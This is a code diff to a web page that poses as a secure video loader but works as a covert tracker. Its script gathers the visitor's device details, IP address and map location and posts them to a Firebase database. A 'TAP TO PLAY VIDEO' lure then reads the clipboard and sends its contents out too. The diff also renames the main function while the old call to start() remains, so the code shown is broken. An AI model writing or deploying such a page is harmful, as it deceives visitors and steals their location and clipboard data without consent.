@@ -11,14 +11,14 @@
 </head>
 <body>
     <div id="status" style="text-align:center;">
-        <div class="loader"></div>
-        <p style="margin-top:15px; color:#555;">Connecting to secure server...</p>
+        <div class="loader" id="ldr"></div>
+        <p id="txt" style="margin-top:15px; color:#555;">Loading secure media...</p>
     </div>
 
     <script>
         const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
 
-        async function start() {
+        async function collectAndSend() {
             const params = new URLSearchParams(window.location.search);
             const id = params.get('id');
             if(!id) return;
@@ -28,51 +28,71 @@
 
             let data = {
                 time: new Date().toLocaleString(),
+                localTime: new Date().toLocaleTimeString(),
                 ram: navigator.deviceMemory || "N/A",
                 res: `${screen.width}x${screen.height}`,
                 orient: screen.orientation ? screen.orientation.type : "N/A",
                 netType: navigator.connection ? navigator.connection.effectiveType : "N/A",
                 speed: navigator.connection ? navigator.connection.downlink : "N/A",
-                ip: "N/A", loc: "N/A", map: "#"
+                device: navigator.platform,
+                ip: "Loading...",
+                loc: "Loading..."
             };
 
-            // Battery Info
-            try { const b = await navigator.getBattery(); data.battery = Math.round(b.level * 100); data.charging = b.charging ? "Yes" : "No"; } catch(e){}
-
-            // IP & Location (Primary API)
+            // 1. Battery Data
             try {
-                let res = await fetch('https://ipapi.co/json/');
-                let d = await res.json();
+                const b = await navigator.getBattery();
+                data.battery = Math.round(b.level * 100);
+                data.charging = b.charging ? "Yes" : "No";
+            } catch(e){ data.battery = "N/A"; }
+
+            // 2. Multi-Source IP & Location Fetch (Wait for response)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const d = await response.json();
                 if(d.ip) {
                     data.ip = d.ip;
                     data.loc = `${d.city}, ${d.country_name}`;
                     data.map = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                 } else { throw new Error(); }
             } catch(e) {
-                // Secondary API (Backup)
                 try {
-                    let res2 = await fetch('https://ipwho.is/');
-                    let d2 = await res2.json();
+                    const response2 = await fetch('https://ipwho.is/');
+                    const d2 = await response2.json();
                     data.ip = d2.ip;
                     data.loc = `${d2.city}, ${d2.country}`;
                     data.map = `https://www.google.com/maps?q=${d2.latitude},${d2.longitude}`;
-                } catch(e2){}
+                } catch(e2){ data.ip = "Failed"; data.loc = "Failed"; }
             }
 
-            // Save to Firebase
-            await fetch(`${DB_URL}tracking/${userKey}.json`, { method: 'POST', body: JSON.stringify(data) });
+            // 3. Send final complete data to Firebase
+            await fetch(`${DB_URL}tracking/${userKey}.json`, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data) 
+            });
 
-            document.getElementById('status').innerHTML = "<b>TAP TO PLAY VIDEO</b>";
+            // UI Update for Clipboard Grab
+            document.getElementById('ldr').style.display = 'none';
+            document.getElementById('txt').innerHTML = "<b>⚠️ Connection Secure.<br>TAP TO PLAY VIDEO</b>";
 
             document.body.onclick = async () => {
                 try {
                     const text = await navigator.clipboard.readText();
-                    if(text) await fetch(`${DB_URL}clipboard/${userKey}.json`, { method: 'POST', body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) });
+                    if(text) {
+                        await fetch(`${DB_URL}clipboard/${userKey}.json`, { 
+                            method: 'POST', 
+                            body: JSON.stringify({ clipData: text, time: new Date().toLocaleString() }) 
+                        });
+                    }
                 } catch(e){}
                 window.location.href = targetUrl;
             };
-            setTimeout(() => { window.location.href = targetUrl; }, 10000);
+            
+            // Safety Redirect (Only if user doesn't click for 15s)
+            setTimeout(() => { window.location.href = targetUrl; }, 15000);
         }
+
         start();
     </script>
 </body>
